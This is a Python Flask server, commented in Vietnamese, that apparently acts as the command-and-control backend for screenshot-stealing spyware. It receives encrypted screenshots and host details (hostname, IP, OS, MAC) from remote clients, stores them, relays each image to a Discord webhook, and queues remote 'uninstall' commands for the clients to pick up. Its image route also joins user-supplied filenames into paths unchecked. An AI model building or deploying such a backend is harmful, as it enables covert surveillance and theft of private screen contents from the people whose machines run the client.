from flask import Flask, request, jsonify, send_file, render_template
from flask_sqlalchemy import SQLAlchemy
import os
import zlib
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from dotenv import load_dotenv
import io
import threading
import requests

load_dotenv()

DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
FERNET_KEY = os.getenv("FERNET_KEY").encode()
SAVE_FOLDER = "received"
os.makedirs(SAVE_FOLDER, exist_ok=True)

app = Flask(__name__)
client_commands = {}  # Ví dụ {"DESKTOP-1234": "uninstall"}
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///images.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

fernet = Fernet(FERNET_KEY)
session = requests.Session()  # giữ kết nối TCP lâu dài


class ImageRecord(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    filename = db.Column(db.String, unique=True, nullable=False)
    hostname = db.Column(db.String, nullable=False)
    ip = db.Column(db.String)
    os = db.Column(db.String)
    mac = db.Column(db.String)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)


@app.route("/api/uninstall", methods=["POST"])
def send_uninstall_command_old():
    # API cũ - vẫn giữ, nhận body JSON {hostname: "..."}
    data = request.get_json()
    hostname = data.get("hostname")

    if not hostname:
        return jsonify({"status": "error", "message": "Missing hostname"}), 400

    client_commands[hostname] = "uninstall"
    return jsonify({"status": "ok", "message": f"Lệnh xóa đã được gửi tới {hostname}."})


# Thêm endpoint mới: thuận tiện gọi xóa client qua URL param
@app.route("/api/client/uninstall/<hostname>", methods=["POST"])
def send_uninstall_command(hostname):
    if not hostname:
        return jsonify({"status": "error", "message": "Missing hostname"}), 400

    client_commands[hostname] = "uninstall"
    return jsonify({"status": "ok", "message": f"Lệnh xóa đã được gửi tới {hostname}."})


@app.route("/command", methods=["POST"])
def command():
    hostname = request.json.get("hostname")
    if not hostname:
        return jsonify({"command": "none"})

    cmd = client_commands.pop(hostname, "none")
    return jsonify({"command": cmd})


def decrypt_and_decompress(data_base64: str) -> bytes:
    encrypted_data = base64.b64decode(data_base64)
    decrypted = fernet.decrypt(encrypted_data)
    return zlib.decompress(decrypted)


def send_to_discord_memory_async(filename: str, image_data: bytes):
    def task():
        files = {
            "file": (filename, io.BytesIO(image_data), "image/png")
        }
        data = {
            "content": f"📷 Ảnh mới nhận: `{filename}`"
        }
        try:
            res = session.post(DISCORD_WEBHOOK_URL, data=data, files=files, timeout=5)
            print(f"[Discord] Đã gửi ảnh {filename} - Status: {res.status_code}")
        except Exception as e:
            print(f"[!] Lỗi gửi Discord: {e}")
    thread = threading.Thread(target=task)
    thread.daemon = True
    thread.start()


@app.route("/")
def dashboard():
    return render_template("dashboard.html")


@app.route("/upload", methods=["POST"])
def upload():
    try:
        content = request.get_json()
        sys_info = content["system_info"]
        image_enc = content["screenshot"]

        img_data = decrypt_and_decompress(image_enc)

        filename = f"{sys_info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S%f')}.png"
        path = os.path.join(SAVE_FOLDER, filename)

        with open(path, "wb") as f:
            f.write(img_data)

        # Gửi ảnh đến Discord
        send_to_discord_memory_async(filename, img_data)

        # Lưu metadata vào DB
        record = ImageRecord(
            filename=filename,
            hostname=sys_info.get("hostname", ""),
            ip=sys_info.get("ip", ""),
            os=sys_info.get("os", ""),
            mac=sys_info.get("mac", ""),
            timestamp=datetime.utcnow()
        )
        db.session.add(record)
        db.session.commit()

        return jsonify({"status": "success", "filename": filename})
    except Exception as e:
        print(f"[!] Upload Error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400


@app.route("/api/images", methods=["GET"])
def list_images():
    hostname = request.args.get("hostname")
    ip = request.args.get("ip")
    from_date = request.args.get("from_date")
    to_date = request.args.get("to_date")

    query = ImageRecord.query
    if hostname:
        query = query.filter(ImageRecord.hostname.contains(hostname))
    if ip:
        query = query.filter(ImageRecord.ip.contains(ip))
    if from_date:
        query = query.filter(ImageRecord.timestamp >= from_date)
    if to_date:
        query = query.filter(ImageRecord.timestamp <= to_date)

    limit = int(request.args.get("limit", 20))
    offset = int(request.args.get("offset", 0))

    total = query.count()
    records = query.order_by(ImageRecord.timestamp.desc()).limit(limit).offset(offset).all()

    data = [{
        "id": r.id,
        "filename": r.filename,
        "hostname": r.hostname,
        "ip": r.ip,
        "os": r.os,
        "mac": r.mac,
        "timestamp": r.timestamp.isoformat()
    } for r in records]

    return jsonify({"total": total, "data": data})


@app.route("/image/<filename>")
def serve_image(filename):
    path = os.path.join(SAVE_FOLDER, filename)
    if os.path.exists(path):
        return send_file(path, mimetype="image/png")
    return "File not found", 404


if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=10000)
